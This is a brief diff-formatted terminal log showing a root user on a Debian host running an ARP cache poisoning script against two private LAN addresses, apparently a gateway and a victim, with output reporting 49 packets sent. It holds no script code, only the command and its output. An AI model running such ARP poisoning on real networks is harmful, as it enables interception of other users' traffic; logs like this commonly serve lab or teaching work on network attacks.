@@ -1,0 +1,4 @@
+root@Debian02:~# ./arpcachepoison.py 192.168.0.1 192.168.0.3
+WARNING: No route found for IPv6 destination :: (no default route ?)
+.................................................^C
+Sent 49 packets.
